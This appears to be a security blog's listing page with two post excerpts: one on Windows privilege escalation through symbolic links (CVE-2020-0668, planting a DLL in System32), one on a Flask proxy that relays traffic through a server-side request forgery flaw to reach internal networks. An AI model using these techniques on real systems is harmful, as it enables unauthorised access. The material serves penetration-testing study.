<!DOCTYPE html>
<html>

  <head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>倾旋的博客</title>
  <meta name="description" content="这个博客主要用来记录自己技术生涯中短小的收获和知识的备忘，还有就是一些做安全服务工作中的感受。方向可能会在不断改变：渗透测试、CTF、高效生活、应急响应、安全建设、读后感、代码审计、漏洞复现、运维杂项等等…
">

  <link rel="stylesheet" href="/css/main.css">
  <link rel="canonical" href="https://payloads.online/page4/">
  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
</head>


  <body>

    <div class="header-placeholder"></div>
<header class="header">
  <div class="wrapper">
    <div id="sidebar-toggle">TOC</div>
    <a class="site-title" href="/">倾旋的博客</a>
    <nav class="site-nav">
      
        
        <a class="page-link" href="/about/">About</a>
      
        
        <a class="page-link" href="/posts/">Posts</a>
      
        
        <a class="page-link" href="/links/">Links</a>
      
        
        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
      
        
        <a class="page-link" href="/feed.xml">RSS</a>
      
    </nav>
  </div>
</header>


    <div class="page-content">
      <div class="wrapper">
        <div class="col-main">
          <div class="home">
  <a class="rss-link" href="/feed.xml">RSS Feed</a>
  <h1 class="page-heading">Articles</h1>

  <ul class="post-list">
    
      <li>
        <h2>
          <a class="post-link" href="/archivers/2020-03-21/1">Windows特权提升漏洞-符号</a>
        </h2>
        
        <div class="post-meta">Mar 21, 2020</div>

        <div class="post-excerpt">
          <!--<h2 id="0x01-windows-特权提升漏洞分类">0X01 Windows 特权提升漏洞分类</h2>

<p>Windows 特权提升相信大家已经不陌生了，常见的场景如：NETWORK SERVICE → SYSTEM</p>

<p>但从漏洞原理去了解，会发现利用漏洞利用本就是一个“使程序逻辑不按照正常方向运转”的过程。</p>

<p>许多需要构建多个苛刻条件的Windows底层漏洞发现绝非偶然，也有许多Windows漏洞的发现是纯属偶然，它们是那么的容易可以利用，并且危害巨大。</p>

<p>从研究成本，我根据自己的理解将Windows漏洞分为以下几类：</p>

<ol>
  <li>Windows内核、服务的底层漏洞（需要长时间的Fuzz跟踪以及很深厚的基础知识）</li>
  <li>Windows服务、相关软件生态的权限控制不当产生的漏洞</li>
  <li>Windows开发者自己本身都未想到过的逻辑漏洞</li>
</ol>

<p>以上3种可能是一个不严谨的分类，但作为一个理解铺垫是足够了。</p>

<h2 id="0x02-权限特权与进程的关系---访问控制模型">0X02 权限（特权）与进程的关系 - 访问控制模型</h2>

<p>访问控制模型有两个主要的组成部分，访问令牌（Access Token）和安全描述符（Security Descriptor），它们分别是访问者和被访问者拥有的东西。通过访问令牌和安全描述符的内容，Windows可以确定持有令牌的访问者能否访问持有安全描述符的对象。</p>

<p>访问令牌是与特定的Windows账户关联的。<strong>当一个Windows账户登录的时候，系统会从内部数据库里读取该账户的信息，然后使用这些信息生成一个访问令牌。在该账户环境下启动的进程，都会获得这个令牌的一个副本，进程中的线程默认持有这个令牌。线程要想去访问某个对象，或者执行某些系统管理相关的操作时，Windows就会使用这个线程持有的令牌进行访问检查。</strong></p>

<p>安全描述符是与被访问对象关联的，它含有这个对象所有者的SID，以及一个访问控制列表（ACL，Access Control List），访问控制列表又包括了DACL（Discretionary Access Control List）和SACL（System Access Control List）——目前还不知道这两个东西的确切翻译——其中，<strong>DACL是安全描述符中最重要的，它里面包含零个或多个访问控制项（ACE，Access Control Entry），每个访问控制项的内容描述了允许或拒绝特定账户对这个对象执行特定操作。</strong>至于SACL，它很少用到，主要是用于系统审计的，它的内容指定了当特定账户对这个对象执行特定操作时，记录到系统日志中。</p>

<p>如文件，点击右键选择“属性”，找到“安全”选项卡，点击“高级”按钮。弹出的对话筐中，“权限”选项卡就是DACL，”审核”选项卡是SACL，“所有者”是Owner、Group。</p>

<p>访问令牌中主要含有以下的内容：</p>

<ul>
  <li>当前登录账户的SID，也就是与令牌关联的账户的SID</li>
  <li>当前登录账户所属的账户组的SID列表</li>
  <li>受限制的SID（Restricted SID）列表</li>
  <li>当前登录账户以及它所属账户组的权限（Privileges）列表</li>
</ul>

<p>SID（Security Identity）是Windows中每个账户和账户组都有的一个标识符，平常我们看到的Administrator，Users等账户或者账户组在Windows内部是使用SID来标识的。例如S-1-5-21-1004336348-1275210071-725345543-1003就是一个完整的SID。每个SID在同一个系统中都是唯一的。</p>

<p>再来看看安全描述符中ACE的具体内容：</p>

<ol>
  <li>特定账户或者账户组的SID；</li>
  <li>一个访问掩码（Access Mask），该掩码指定了具体的访问权限（Access Rights），也就是可以对该对象执行的操作；</li>
  <li>一个位标记，指示了这个ACE的类型；</li>
  <li>一组位标记，指示了安全描述符所属对象的子对象是否继承这个ACE；</li>
</ol>

<p>所有的可访问对象都有三种ACE，分别是Access-denied ACE，Access-allowed ACE，System-audit ACE。Access-denied ACE用于拒绝账户访问，Access-allowed ACE用于允许账户访问，而System-audit ACE用于SACL中。</p>

<p><em>当一个线程尝试去访问一个对象时，系统会检查线程持有的令牌以及被访问对象的安全描述符中的DACL。如果安全描述符中不存在DACL，则系统会允许线程进行访问。</em></p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/dbcc8beb778c08bffca1bbb5a89c0553.png" alt="2020-03-21-16-51-32" /></p>

<p>如果存在DACL，系统会顺序遍历DACL中的每个ACE，检查ACE中的SID在线程的令牌中是否存在。</p>

<p>当满足以下条件时，遍历会终止：</p>

<p>某个Access-denied ACE中的SID在线程令牌中存在，而且该ACE中的权限与线程要求的权限相符，此时系统拒绝该线程访问对象。</p>

<p>某个Access-allowed ACE中的SID在线程令牌中存在，而且该ACE中的权限与线程要求的权限相符，此时系统允许线程访问对象。所有ACE中的SID在线程令牌中均不存在，此时系统拒绝线程访问对象。</p>

<p>下图是转自MSDN的，Object对象的DACL中含有三个ACE：</p>

<ol>
  <li>第一个ACE拒绝Andrew账户对Object进行读取，写入和执行操作；</li>
  <li>第二个ACE允许Group A账户组中的所有账户对Object进行写入操作；</li>
  <li>第三个ACE允许任何账户对Object进行读取和执行操作；</li>
</ol>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/4ba68ff1b94eb90d5b001dd13ca9bc14.png" alt="2020-03-21-16-51-52" /></p>

<p>线程A试图访问Object，在遍历DACL的时候，遇到第一个ACE，满足上述的条件，遍历终止，线程A被拒绝访问Object，尽管线程A的访问令牌中含有Group A账户组的SID，并满足第二个ACE。同理，第三个ACE也没有被检查。对于线程B的分析是一样的，这里就不啰嗦了。可见ACE的排列顺序对线程能否访问对象是很重要的。</p>

<p>前面在介绍访问令牌的内容时，提到一个“受限制的SID列表”，对于这个东西，我曾经迷惑了很久，始终搞不懂它是干什么用的。经过一些实验之后，猜出了它的用途，尽管不一定对，这里简单说一下。</p>

<p>当一个访问令牌中含有受限制的SID列表时，系统在遍历ACE的时候只会与这些受限制的SID进行匹配，而忽略令牌中其余的SID，也就是相当于从访问令牌中删除了其它的SID。</p>

<p>另外，还有令牌中的权限列表，权限与对象访问无关，所以与安全描述符，SID等无关。当线程执行一些管理相关的操作时，系统会检查该线程的令牌中是否含有特定的权限，如果有，则允许线程执行该操作，否则拒绝。要查看完整的权限列表，可以运行gpedit.msc，然后定位到“计算机配置-Windows设置-安全设置-本地策略-用户权利指派”。</p>

<p>— 引自：<a href="https://www.cnblogs.com/zplutor/archive/2010/01/05/1639892.html">Zplutor’s</a></p>

<p>令牌结构：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> lkd&gt; **dt nt!_token**
       +0x000 TokenSource      : _TOKEN_SOURCE
       +0x010 TokenId          : _LUID
       +0x018 AuthenticationId : _LUID
       +0x020 ParentTokenId    : _LUID
       +0x028 ExpirationTime   : _LARGE_INTEGER
       +0x030 TokenLock        : Ptr32 _ERESOURCE
       +0x038 AuditPolicy      : _SEP_AUDIT_POLICY
       +0x040 ModifiedId       : _LUID
       +0x048 SessionId        : Uint4B
       +0x04c UserAndGroupCount : Uint4B
       +0x050 RestrictedSidCount : Uint4B
       +0x054 PrivilegeCount   : Uint4B
       +0x058 VariableLength   : Uint4B
       +0x05c DynamicCharged   : Uint4B
       +0x060 DynamicAvailable : Uint4B
       +0x064 DefaultOwnerIndex : Uint4B
       +0x068 UserAndGroups    : Ptr32 _SID_AND_ATTRIBUTES
       +0x06c RestrictedSids   : Ptr32 _SID_AND_ATTRIBUTES
       +0x070 PrimaryGroup     : Ptr32 Void
       +0x074 Privileges       : Ptr32 _LUID_AND_ATTRIBUTES
       +0x078 DynamicPart      : Ptr32 Uint4B
       +0x07c DefaultDacl      : Ptr32 _ACL
       +0x080 TokenType        : _TOKEN_TYPE
       +0x084 ImpersonationLevel : _SECURITY_IMPERSONATION_LEVEL
       +0x088 TokenFlags       : Uint4B
       +0x08c TokenInUse       : UChar
       +0x090 ProxyData        : Ptr32 _SECURITY_TOKEN_PROXY_DATA
       +0x094 AuditData        : Ptr32 _SECURITY_TOKEN_AUDIT_DATA
       +0x098 OriginatingLogonSession : _LUID
       +0x0a0 VariablePart     : Uint4B
</code></pre></div></div>

<h2 id="0x03-从cve-2020-0668说起">0x03 从CVE-2020-0668说起</h2>

<p>原文：<a href="https://itm4n.github.io/cve-2020-0668-windows-service-tracing-eop/">https://itm4n.github.io/cve-2020-0668-windows-service-tracing-eop/</a></p>

<p>该漏洞作者发现了一个存在于Windows操作系统vista版本到现在最新版本都存在的漏洞，同时也影响服务器操作系统（2003-2016）。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/84be62b9423b246826302f410c6dd9a5.png" alt="2020-03-21-16-52-50" /></p>

<p>漏洞的原因：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/c12c8308ea5e04aec54a90f6a3e516c1.png" alt="2020-03-21-16-53-08" /></p>

<p><code class="language-plaintext highlighter-rouge">HKLM\SOFTWARE\Microsoft\Tracing</code> 注册表项任意用户（Everyone）可写可读，Tracing注册表项主要用于Windows服务跟踪调试，调试过程中会以SYSTEM权限产生一个日志文件：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/1267d4510ea569498c9a72c6bb091746.png" alt="2020-03-21-16-53-22" /></p>

<p>其中：<code class="language-plaintext highlighter-rouge">FileDirectory</code> 项主要用于设置日志产生的目录，经过作者分析发现，日志文件名不可控、日志内容更不可控，其次，当日志文件大小超过了<code class="language-plaintext highlighter-rouge">MaxFileSize</code>时，会将文件重命名到当前目录，扩展名改为OLD。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    \RPC Control\RASTAPI.LOG -&gt; \??\C:\EXPLOIT\FakeDll.dll (owner = current user)
    \RPC Control\RASTAPI.OLD -&gt; \??\C:\Windows\System32\WindowsCoreDeviceInfo.dll
</code></pre></div></div>

<p>这个过程中，作者利用了两个<strong><a href="https://github.com/googleprojectzero/symboliclink-testing-tools">符号链接</a></strong>，将自己的DLL文件轻松写入<code class="language-plaintext highlighter-rouge">C:\Windows\system32\</code>目录。</p>

<h3 id="符号链接">符号链接</h3>

<p><a href="https://github.com/googleprojectzero/symboliclink-testing-tools">https://github.com/googleprojectzero/symboliclink-testing-tools</a></p>

<blockquote>
  <p>Project Zero是谷歌于2014年7月宣布的互联网安全项目，该团队主要由谷歌内部顶尖安全工程师组成，旨在发现、跟踪和修补全球性的软件安全漏洞，让用户可以更加惬意的享受互联网生活，同时可以放心的点击广告。 [1] “Project Zero”所处理的安全漏洞通常都属于“零日漏洞”范畴，网络黑客或者政府有组织的黑客团队可以利用这些漏洞展开网络监听等操作。
— 百度百科</p>
</blockquote>

<p>通过学习Project Zero中的开源项目，以及他们的博客，给我带来更多的学习兴趣：<a href="https://googleprojectzero.blogspot.com/">https://googleprojectzero.blogspot.com/</a></p>

<p>符号链接技术是在2015年公布的，翻到一篇2015年关于Windows 10的沙箱绕过防御（那时候国内还在用Windows 8? 7吧）。<a href="https://googleprojectzero.blogspot.com/2015/08/windows-10hh-symbolic-link-mitigations.html">https://googleprojectzero.blogspot.com/2015/08/windows-10hh-symbolic-link-mitigations.html</a></p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/c43009d0e09991c11d64bfa47b29e9f6.png" alt="2020-03-21-16-54-18" /></p>

<p>这篇文章介绍了不止一种链接方式，“Link”可以理解为一种传送门，你可以使用CreateSymLink.exe做一次实验：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CreateSymLink.exe C:\Log\1.txt E:\Log\1.txt
echo 1 &gt; C:\Log\1.txt
</code></pre></div></div>

<p>这时你会发现，<code class="language-plaintext highlighter-rouge">E:\Log\1.txt</code>中的内容就是1，代入场景：如果一个高权限用户，要向一个低权限用户可控的目录中写入文件，那么低权限用户可以将目标文件通过符号链接重定向到另外一个无权限的文件，甚至达到任意代码执行。</p>

<p><strong>其他链接方式：</strong></p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/3ae693eb243b16f01fcdb602ef79faff.png" alt="2020-03-21-16-54-32" /></p>

<h2 id="0x04-ntfs挂载点的魔术--cve-2019-18194">0x04 NTFS挂载点的魔术 -(CVE-2019-18194)</h2>

<p>感兴趣可以点击油管地址看一下，非常有趣：</p>

<p><a href="https://www.youtube.com/watch?v=88qeaLq98Gc">https://www.youtube.com/watch?v=88qeaLq98Gc</a></p>

<h2 id="0x05-其他漏洞">0x05 其他漏洞</h2>

<p>以下漏洞均使用了传送门技术达到的特权提升</p>

<ul>
  <li>【CVE-2018-0952】<a href="https://github.com/atredispartners/advisories/blob/master/ATREDIS-2018-0004.md">ATREDIS-2018-0004: Diagnostic Hub Standard Collector Elevation Of Privilege Vulnerability</a>
    <ol>
      <li>An Event Trace Log (.etl) file is created in the scratch path: <code class="language-plaintext highlighter-rouge">C:\Users\Bob\AppData\Local\Temp\Microsoft\F12\perftools\visualprofiler\c13851b2-b1e1-438f-bf73-949df897f1bf.1.m.etl</code></li>
      <li>A Report folder is also created in the scratch path: <code class="language-plaintext highlighter-rouge">C:\Users\Bob\AppData\Local\Temp\Microsoft\F12\perftools\visualprofiler\Report.c13851b2-b1e1-438f-bf73-949df897f1bf.1</code></li>
      <li>A folder with a random GUID is created in the report folder: <code class="language-plaintext highlighter-rouge">C:\Users\Bob\AppData\Local\Temp\Microsoft\F12\perftools\visualprofiler\Report.c13851b2-b1e1-438f-bf73-949df897f1bf.1\EAD6A227-31D4-4EA2-94A9-5DF276F69E65</code></li>
    </ol>
  </li>
</ul>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/62ea564620d94af25618d1d411925fa1.png" alt="2020-03-21-16-56-47" /></p>

<ul>
  <li><a href="https://www.youtube.com/watch?v=1axTbxPz2_8">CVE-2020-0683 MSI Packages Symbolic Links Processing - Windows 10 Privilege Escalation</a></li>
  <li><a href="https://github.com/nomi-sec/PoC-in-GitHub#cve-2020-8950">CVE-2020-8950</a></li>
  <li><a href="https://github.com/nomi-sec/PoC-in-GitHub#cve-2020-0686">CVE-2020-0683</a></li>
  <li><a href="https://github.com/nomi-sec/PoC-in-GitHub#cve-2019-1002101">CVE-2019-1002101</a></li>
  <li><a href="https://github.com/nomi-sec/PoC-in-GitHub#cve-2019-0986">CVE-2019-0986</a></li>
  <li><a href="https://github.com/nomi-sec/PoC-in-GitHub#cve-2018-1088">CVE-2018-1088</a></li>
  <li>……</li>
</ul>

<h2 id="0x06-总结-小心-完全控制">0x06 总结-小心 “完全控制”</h2>

<p>当目录存在Everyone可读可写=“完全控制”的情况下，通过不同种类的符号链接，我们可以将文件目录进行重定向操作，只要寻找到高至低的写、移动操作，就可以直接利用，挖掘Windows漏洞变得简单。其次，发现“完全控制”的目录还可以直接进行DLL劫持攻击，另外除了目录还可以发现一些“完全控制”的注册表，再进行逆向查找分析，相信一定会有所收获。</p>

<h2 id="参考">参考</h2>

<ul>
  <li>【TotalAV 2020 4.14.31 Privilege Escalation (CVE-2019-18194)】<a href="https://www.youtube.com/watch?v=88qeaLq98Gc">https://www.youtube.com/watch?v=88qeaLq98Gc</a></li>
  <li>【#AVGater: Getting Local Admin by Abusing the Anti-Virus Quarantine】<a href="https://bogner.sh/2017/11/avgater-getting-local-admin-by-abusing-the-anti-virus-quarantine/">https://bogner.sh/2017/11/avgater-getting-local-admin-by-abusing-the-anti-virus-quarantine/</a></li>
  <li>【CVE-2019-1388：通过 UAC 进行 Windows 提权】<a href="http://blog.leanote.com/post/snowming/38069f423c76">http://blog.leanote.com/post/snowming/38069f423c76</a></li>
  <li>【CVE-2018-0952：Windows Standard Collector服务中的特权提升漏洞分析】<a href="https://www.freebuf.com/vuls/184609.html">https://www.freebuf.com/vuls/184609.html</a></li>
  <li>【ATREDIS-2018-0004: Diagnostic Hub Standard Collector Elevation Of Privilege Vulnerability】<a href="https://github.com/atredispartners/advisories/blob/master/ATREDIS-2018-0004.md">https://github.com/atredispartners/advisories/blob/master/ATREDIS-2018-0004.md</a></li>
  <li>【Windows 访问控制模型（二）之安全描述符】<a href="https://blog.csdn.net/hjxyshell/article/details/38503387">https://blog.csdn.net/hjxyshell/article/details/38503387</a></li>
  <li>【Windows 访问控制模型（一）】<a href="https://blog.csdn.net/hjxyshell/article/details/38502933">https://blog.csdn.net/hjxyshell/article/details/38502933</a></li>
  <li>【Privilege Constants (Authorization)】<a href="https://docs.microsoft.com/en-ca/windows/win32/secauthz/privilege-constants?redirectedfrom=MSDN">https://docs.microsoft.com/en-ca/windows/win32/secauthz/privilege-constants?redirectedfrom=MSDN</a></li>
  <li>【McAfee Endpoint Security arbitrary file write Elevation of Privilege (CVE-2019-3582)】<a href="https://offsec.almond.consulting/mcafee-endpoint-security-arbitrary-file-write-eop.html">https://offsec.almond.consulting/mcafee-endpoint-security-arbitrary-file-write-eop.html</a></li>
  <li>【Steam EoP 0day vulnerability (filesystem based)】<a href="https://www.youtube.com/watch?v=I93aH86BUaE">https://www.youtube.com/watch?v=I93aH86BUaE</a></li>
  <li>【Windows 10^H^H Symbolic Link Mitigations】<a href="https://googleprojectzero.blogspot.com/2015/08/windows-10hh-symbolic-link-mitigations.html">https://googleprojectzero.blogspot.com/2015/08/windows-10hh-symbolic-link-mitigations.html</a></li>
  <li>【CVE-2020-0683 MSI Packages Symbolic Links Processing - Windows 10 Privilege Escalation】<a href="https://www.youtube.com/watch?v=1axTbxPz2_8">https://www.youtube.com/watch?v=1axTbxPz2_8</a></li>
  <li>【CVE-2020-0668 - Windows LPE - Análise e Exploração】<a href="https://www.youtube.com/watch?v=KiqvlIc-cxY&t=770s">https://www.youtube.com/watch?v=KiqvlIc-cxY</a></li>
  <li>【CVE-2020-0668 - A Trivial Privilege Escalation Bug in Windows Service Tracing】<a href="https://itm4n.github.io/cve-2020-0668-windows-service-tracing-eop/">https://itm4n.github.io/cve-2020-0668-windows-service-tracing-eop/</a></li>
</ul>
-->
          <!---->
          Windows 特权提升相信大家已经不陌生了，常见的场景如：NETWORK SERVICE → SYSTEM但从漏洞原理去了解，会发现利用漏洞利用本就是一个“使程序逻辑不按照正常方向运转”的过程...
          <p>
            <a class="post-link" href="/archivers/2020-03-21/1">Read More »</a>
          </p>
        </div>
      </li>
    
      <li>
        <h2>
          <a class="post-link" href="/archivers/2020-03-21/2">SSRF漏洞配合Flask的巧妙利用 - 内网漫游</a>
        </h2>
        
        <div class="post-meta">Mar 21, 2020</div>

        <div class="post-excerpt">
          <!--<h2 id="ssrf-服务器请求伪造">SSRF 服务器请求伪造</h2>

<p>SSRF(Server-side Request Forge, 服务端请求伪造)。由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。</p>

<h3 id="常见的功能点">常见的功能点</h3>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/488f1abdc7ce71395c6adc1eafaec9bc.png" alt="2020-03-21-16-58-32" /></p>

<ul>
  <li>Net-NTLM &amp;&amp; NTLM Relay</li>
  <li>获取服务器真实IP</li>
  <li>端口扫描</li>
  <li><strong>网页代理</strong></li>
  <li>……</li>
</ul>

<h3 id="网页代理---http-proxy">网页代理 - HTTP Proxy</h3>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2254f77d861f4e0ed512fb96cbf4e0cc.png" alt="2020-03-21-17-01-01" /></p>

<p><strong>客户端应用HTTP代理后，可通过代理服务器访问内网HTTP协议资源</strong></p>

<p><strong>而在SSRF场景，需要SSRF具备支持HTTP两大请求方式：GET、POST，且有响应Body</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /application/services/proxy/doPostAndGet HTTP/1.1
Host: app.domain.com
Connection: keep-alive
Content-Length: XX
Content-Type: application/json
Accept: */*
Referer: http://app.domain.com/application/portal/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

{
    "url":"http://domain.com/sso?login",
    "method":"post",
    "jsonBody":"{\"username\":\"123456\"}"
}
</code></pre></div></div>

<h2 id="flask-框架">Flask 框架</h2>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/d583d5996730b6dedece0d0a37293330.png" alt="2020-03-21-17-02-11" /></p>

<p>Flask是一个用Python编写的Web应用程序框架，它基于Werkzeug WSGI工具包和Jinja2模板引擎。</p>

<p>Flask也被称为“microframework” ，因为它使用简单的核心，用extension增加其他功能，它没有默认使用的数据库、窗体验证工具。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span>
<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">hello_world</span><span class="p">():</span>
    <span class="k">return</span> <span class="s">'Hello, World!'</span>
</code></pre></div></div>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/bd5986bb7d7072741938d609bcbcbbac.png" alt="2020-03-21-17-02-36" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ export FLASK_APP=hello.py
$ python -m flask run
 * Running on http://127.0.0.1:5000/
</code></pre></div></div>
<h3 id="flask-框架的请求流程">Flask 框架的请求流程</h3>

<ol>
  <li>befor_first_request</li>
  <li>befor_request</li>
  <li>after_request</li>
  <li>teardown_request → 异常处理</li>
  <li>after_this_request</li>
</ol>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/aa6371f165a89586b6b27e416d6140aa.png" alt="2020-03-21-17-03-02" /></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">Response</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">before_request</span>
<span class="k">def</span> <span class="nf">_proxy</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">request</span><span class="p">(</span>
        <span class="n">method</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">method</span><span class="p">,</span>
        <span class="n">url</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">url</span><span class="p">,</span>
        <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="n">key</span><span class="p">:</span> <span class="n">value</span> <span class="k">for</span> <span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span> <span class="ow">in</span> <span class="n">request</span><span class="p">.</span><span class="n">headers</span><span class="p">},</span>
        <span class="n">data</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">get_data</span><span class="p">(),</span>
        <span class="n">cookies</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">cookies</span><span class="p">,</span>
        <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

    <span class="n">excluded_headers</span> <span class="o">=</span> <span class="p">[</span><span class="s">'content-encoding'</span><span class="p">,</span> <span class="s">'content-length'</span><span class="p">,</span> <span class="s">'transfer-encoding'</span><span class="p">,</span> <span class="s">'connection'</span><span class="p">]</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">[(</span><span class="n">name</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span> <span class="k">for</span> <span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">.</span><span class="n">raw</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">items</span><span class="p">()</span>
               <span class="k">if</span> <span class="n">name</span><span class="p">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">excluded_headers</span><span class="p">]</span>

    <span class="n">response</span> <span class="o">=</span> <span class="n">Response</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="n">content</span><span class="p">,</span> <span class="n">resp</span><span class="p">.</span><span class="n">status_code</span><span class="p">,</span> <span class="n">headers</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">response</span>
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
</code></pre></div></div>

<p>Flask的默认端口是：5000</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/811e55d62514ad3fde7ccac72b925cf3.png" alt="2020-03-21-17-03-33" /></p>

<p>插件名称：SwitchyOmega</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/ce2bbd6872539ded588a40dc94d5e7f3.png" alt="2020-03-21-17-03-48" /></p>

<p>通过把代理服务器设置为5000（Flask默认）端口，浏览器的所有请求都会经过这五个装饰器，在每个装饰器中，可以写自己的检测规则。由于许多的SSRF漏洞接口返回的Content-Type始终都是一样的，因此会产生图片、JS等静态文件无法加载，下面我们将解决这个问题。</p>

<h3 id="解决文件类型问题">解决文件类型问题</h3>

<p>遇到这个问题，首先分析浏览器为什么无法加载。</p>

<ol>
  <li>SSRF漏洞接口返回的Content-Type是Json，那么我们还需要将Json转化为一个字典，把DATA取出。</li>
  <li>根据SSRF漏洞请求的URI来定义MIME Type，Response返回对应的MIME Type即可解决</li>
</ol>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">get_filetype</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
    <span class="n">content_type</span> <span class="o">=</span> <span class="s">'text/html'</span>
    <span class="n">response_mimetype</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">'.png'</span><span class="p">:</span><span class="s">'image/png'</span><span class="p">,</span>
        <span class="s">'.js'</span><span class="p">:</span><span class="s">'application/javascript'</span><span class="p">,</span>
        <span class="s">'.jpg'</span><span class="p">:</span><span class="s">'image/jpeg'</span><span class="p">,</span>
        <span class="s">'.gif'</span><span class="p">:</span> <span class="s">'image/gif'</span><span class="p">,</span>
        <span class="s">'.jpeg'</span><span class="p">:</span><span class="s">'image/jpeg'</span><span class="p">,</span>
        <span class="s">'.ico'</span><span class="p">:</span><span class="s">'image/x-icon'</span><span class="p">,</span>
        <span class="s">'.css'</span><span class="p">:</span><span class="s">'text/css'</span><span class="p">,</span>
        <span class="s">'.svg'</span><span class="p">:</span><span class="s">'image/svg+xml'</span><span class="p">,</span>
    <span class="p">}</span>
    <span class="n">disassembled</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    <span class="n">filename</span><span class="p">,</span> <span class="n">file_ext</span> <span class="o">=</span> <span class="n">splitext</span><span class="p">(</span><span class="n">basename</span><span class="p">(</span><span class="n">disassembled</span><span class="p">.</span><span class="n">path</span><span class="p">))</span>
    <span class="n">content_type</span> <span class="o">=</span> <span class="n">response_mimetype</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">file_ext</span><span class="p">,</span> <span class="s">'text/html'</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">content_type</span>
</code></pre></div></div>

<p>这里定义了一些常见的MIME类型，通过截取URI的文件扩展名来找到对应的MIME类型，默认找不到就以HTML返回，不知道还有没有更赞的办法，如果有欢迎分享。</p>

<h3 id="content-encoding问题">Content-Encoding问题</h3>

<p>Accept-Encoding 和Content-Encoding是HTTP中用来对采用哪种编码格式传输正文进行协定的一对头部字段。</p>

<p>通过SSRF漏洞接口返回的通常可能是附带Content-Encoding头的响应，但与SSRF目标返回的不匹配，会造成网页展示不完全的情况。（本质上是接口取回的内容已经是解码后的，但接口本身可能又有编码头）</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">excluded_headers</span> <span class="o">=</span> <span class="p">[</span><span class="s">'content-encoding'</span><span class="p">,</span> <span class="s">'content-length'</span><span class="p">,</span> <span class="s">'transfer-encoding'</span><span class="p">,</span> <span class="s">'connection'</span><span class="p">]</span>
